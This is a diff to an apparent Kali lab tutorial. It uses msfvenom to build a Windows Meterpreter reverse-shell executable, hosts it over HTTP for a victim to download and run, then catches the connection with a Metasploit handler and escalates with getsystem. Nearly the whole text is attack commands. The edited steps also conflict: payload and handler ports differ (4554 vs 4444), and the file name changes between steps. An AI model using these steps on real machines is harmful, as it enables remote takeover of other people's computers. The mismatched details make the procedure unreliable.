@@ -31,16 +31,19 @@ Get your Kali IP atfirst:
 
 **Command**: 
 ```
-sudo msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<**kali_ip**> lport=4444 -f exe -o any_name.exe
+sudo msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<**kali_ip**> lport=4554 -f exe -o any_name.exe
 ```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.102 LPORT=4554 -f exe -o hackme.exe
+
+
 Here the payload generation is successful and saved as our given name myexploit.exe 
 
 ### Step 3: Host Payload for Delivery
 **Command**: 
 python3 -m http.server -b <your_machine_ip> <port_number>
-
+### N.B (Use port 8000 (or any port except 4554)
 **Example**- After that open browser from the victim machine and use the url you just started as server  http://192.168.0.7:8999 
-
+### example - python3 -m http.server -b 192.168.56.102 4444 
 ### Now download the payload you have just created. 
 
 
@@ -61,22 +64,30 @@ Set listening payload which is same as our msfvenom payload
 **Command**: 
 set payload payload/windows/x64/meterpreter/reverse_tcp 
 
-Step 4: Now check the available options 
-Command: show options
+### Step 4: Now check the available options 
+**Command**: 
+show options
 
-Step 5: Local Host Setup 
+### Step 5: Local Host Setup 
 Now set the LHOST (attacker machine IP or interface) where the victim 
 machine will connect. 
 
-Command: set lhost 192.168.0.7 
+**Command**:
+set lhost 192.168.0.7 
 
-Step 6: now set the LHOST port (reverse connection port)  
-Command: set lport 4444 
+### Step 6: now set the LHOST port (reverse connection port)  
+**Command**: 
+set lport 4444 
 Then use,  
-Command: exploit
+**Command**: 
+exploit
 
-Step 8: Now we will check the system info and the privileges we have gained. 
-Command: sysinfo 
-Command: getsystem 
+### Step 7: now download the file and run it .(dont do it earlier)
+
+### Step 8: Now we will check the system info and the privileges we have gained. 
+**Command**: 
+sysinfo 
+**Command**: 
+getsystem 
 
 
